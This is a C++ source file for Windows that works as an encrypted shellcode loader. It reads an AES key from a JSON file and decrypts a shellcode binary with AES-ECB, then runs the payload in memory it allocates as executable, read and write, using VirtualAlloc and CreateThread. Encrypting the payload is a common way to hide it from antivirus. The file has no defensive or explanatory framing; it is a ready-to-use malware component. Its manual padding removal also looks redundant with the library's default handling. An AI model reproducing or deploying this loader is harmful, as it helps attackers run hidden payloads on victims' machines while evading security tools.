// decrypt_run.cpp

#include <iostream>
#include <fstream>
#include <vector>
#include <windows.h>
#include <cryptopp/aes.h>
#include <cryptopp/modes.h>
#include <cryptopp/filters.h>
#include "json.hpp"  // single header JSON parser

using json = nlohmann::json;
using namespace CryptoPP;

std::vector<uint8_t> load_key(const std::string& filename) {
    std::ifstream file(filename);
    json j;
    file >> j;
    return j["aes_key"].get<std::vector<uint8_t>>();
}

std::vector<uint8_t> load_file(const std::string& filename) {
    std::ifstream file(filename, std::ios::binary);
    return std::vector<uint8_t>((std::istreambuf_iterator<char>(file)), {});
}

std::vector<uint8_t> decrypt_shellcode(const std::vector<uint8_t>& encrypted, const std::vector<uint8_t>& key) {
    ECB_Mode<AES>::Decryption decryptor;
    decryptor.SetKey(key.data(), key.size());

    std::string decrypted;
    CryptoPP::StringSource s(
        encrypted.data(), encrypted.size(), true,
        new CryptoPP::StreamTransformationFilter(decryptor, new CryptoPP::StringSink(decrypted))
    );

    // Remove padding
    uint8_t padding_length = decrypted.back();
    decrypted.resize(decrypted.size() - padding_length);

    return std::vector<uint8_t>(decrypted.begin(), decrypted.end());
}

void execute_shellcode(const std::vector<uint8_t>& shellcode) {
    LPVOID mem = VirtualAlloc(
        nullptr,
        shellcode.size(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    memcpy(mem, shellcode.data(), shellcode.size());

    HANDLE thread = CreateThread(
        nullptr,
        0,
        (LPTHREAD_START_ROUTINE)mem,
        nullptr,
        0,
        nullptr
    );

    WaitForSingleObject(thread, INFINITE);
}

int main() {
    try {
        std::vector<uint8_t> key = load_key("key.json");
        std::vector<uint8_t> encrypted_shellcode = load_file("encrypted_shellcode.bin");
        std::vector<uint8_t> shellcode = decrypt_shellcode(encrypted_shellcode, key);

        std::cout << "[+] Shellcode decrypted, executing...\n";
        execute_shellcode(shellcode);
    }
    catch (const std::exception& e) {
        std::cerr << "[!] Error: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}
